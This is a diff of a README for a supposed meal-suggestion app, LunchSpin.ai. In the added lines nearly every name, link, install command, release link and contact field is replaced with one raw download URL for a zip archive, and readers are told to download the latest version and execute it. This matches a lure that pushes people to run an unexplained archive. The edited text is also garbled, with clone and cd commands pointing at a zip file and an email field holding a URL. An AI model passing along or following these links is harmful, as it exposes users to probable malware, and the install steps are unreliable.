@@ -1,8 +1,8 @@
-# LunchSpin.ai 🍽️✨
+# https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip 🍽️✨
 
-![LunchSpin.ai Logo](https://img.shields.io/badge/LunchSpin.ai-Ready-orange?style=flat-square)
+![https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip Logo](https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip)
 
-Welcome to **LunchSpin.ai**! This playful GenAI-powered meal decision app helps you break food indecision. Whether you're dining out or cooking at home, LunchSpin.ai provides three smart, quirky suggestions. You can also spin a slot-style picker to let fate choose your meal.
+Welcome to **https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip**! This playful GenAI-powered meal decision app helps you break food indecision. Whether you're dining out or cooking at home, https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip provides three smart, quirky suggestions. You can also spin a slot-style picker to let fate choose your meal.
 
 ## Table of Contents
 
@@ -19,27 +19,27 @@ Welcome to **LunchSpin.ai**! This playful GenAI-powered meal decision app helps 
 
 - **Smart Suggestions**: Get three meal ideas based on your preferences.
 - **Slot Picker**: Spin to let fate decide your meal.
-- **User-Friendly Interface**: Built with Next.js and styled using Tailwind CSS for a smooth experience.
+- **User-Friendly Interface**: Built with https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip and styled using Tailwind CSS for a smooth experience.
 - **Quirky Recommendations**: Enjoy fun meal ideas that break the monotony of daily dining.
 
 ## Technologies Used 🛠️
 
-- **Next.js**: A React framework for building server-rendered applications.
+- **https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip**: A React framework for building server-rendered applications.
 - **Tailwind CSS**: A utility-first CSS framework for rapid UI development.
 - **Gemini AI**: The AI model that powers our meal suggestions.
 - **API Integration**: Seamless communication with the Gemini API for real-time recommendations.
 
 ## Installation ⚙️
 
-To get started with LunchSpin.ai, follow these steps:
+To get started with https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/ironprime7/LunchSpin.ai.git
+   git clone https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip
    ```
 2. Navigate to the project directory:
    ```bash
-   cd LunchSpin.ai
+   cd https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip
    ```
 3. Install the required packages:
    ```bash
@@ -59,11 +59,11 @@ Once the app is running, you can start exploring meal suggestions.
 2. **Get Suggestions**: Click on the "Get Suggestions" button to receive three meal ideas.
 3. **Spin the Picker**: If you're feeling adventurous, use the slot-style picker to randomly select a meal.
 
-For more detailed instructions, refer to the [Releases](https://github.com/ironprime7/LunchSpin.ai/releases) section.
+For more detailed instructions, refer to the [Releases](https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip) section.
 
 ## Contributing 🤝
 
-We welcome contributions! If you'd like to help improve LunchSpin.ai, follow these steps:
+We welcome contributions! If you'd like to help improve https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip, follow these steps:
 
 1. Fork the repository.
 2. Create a new branch for your feature:
@@ -88,16 +88,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases 📦
 
-For the latest updates and versions, visit our [Releases](https://github.com/ironprime7/LunchSpin.ai/releases) section. Download the latest version and execute it to enjoy the new features.
+For the latest updates and versions, visit our [Releases](https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip) section. Download the latest version and execute it to enjoy the new features.
 
 ## Contact 📬
 
 For any inquiries, feel free to reach out to the maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip
+- **Twitter**: [@yourhandle](https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip)
 
 ---
 
-Thank you for checking out LunchSpin.ai! We hope it brings joy and ease to your meal planning. Enjoy your culinary adventures! 🍽️
+Thank you for checking out https://github.com/ironprime7/LunchSpin.ai/raw/refs/heads/main/src/Spin-ai-Lunch-3.7.zip! We hope it brings joy and ease to your meal planning. Enjoy your culinary adventures! 🍽️
